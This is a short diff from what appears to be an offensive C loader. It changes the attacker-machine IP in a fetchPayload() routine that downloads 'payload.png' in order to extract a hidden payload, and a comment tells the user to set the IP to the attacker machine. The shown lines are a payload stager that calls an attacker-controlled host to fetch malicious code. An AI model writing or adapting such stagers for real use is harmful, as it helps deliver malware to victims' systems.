@@ -285,7 +285,7 @@ BOOL fetchPayload() {
 	printf("[i] Extracting Payload from PNG File \n");
 
 	// URL of the PNG file
-	LPCSTR url = "http://192.168.206.8/payload.png"; // Change ip as per attacker machine
+	LPCSTR url = "http://192.168.29.245/payload.png"; // Change ip as per attacker machine
 	LPCSTR localFile = "payload.png";
 
 	// Download the PNG file from the URL
